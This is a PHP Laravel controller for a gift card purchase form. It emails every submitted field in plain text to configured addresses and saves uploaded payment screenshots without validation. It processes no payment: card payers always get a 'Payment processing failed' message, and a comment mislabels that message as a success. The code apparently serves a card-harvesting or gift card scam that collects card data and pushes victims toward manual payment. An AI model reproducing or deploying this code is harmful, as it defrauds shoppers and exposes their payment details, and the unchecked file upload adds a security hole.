<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class PurchaseGiftcardController extends Controller
{
    public function store()
    {
        // Get all the data that is not null
        $data = array_filter(request()->all(), function($value) {
            return !is_null($value);
        });

        // Remove _token from the data
        unset($data['_token']);

        // Handle file upload if present
        if (request()->hasFile('payment_screenshot')) {
            $path = request()->file('payment_screenshot')->store('payment_screenshots', 'public');
            $data['payment_screenshot'] = $path;
        }

        // Get response emails (array of emails)
        $emails = app(\App\Settings\GeneralSetting::class)->receiving_email;

        // Send email with the details
        Mail::raw(json_encode($data, JSON_PRETTY_PRINT), function($message) use ($emails) {
            foreach ($emails as $email) {
                $message->to($email);
            }

            $message->subject('New Gift Card Purchase Details');
        });

        // Check payment option and flash appropriate message
        if (request()->input('payment-option') === 'card') {
            // Flash success response for card payment
            session()->flash('error', 'Payment processing failed. Please try again.');
        } else {
            // Flash error for other payment options
            session()->flash('success', 'Request submitted successfully. Your giftcard will be sent to the submitted email address after payment confirmation');
        }

        // Redirect back
        return redirect()->back();
    }
}
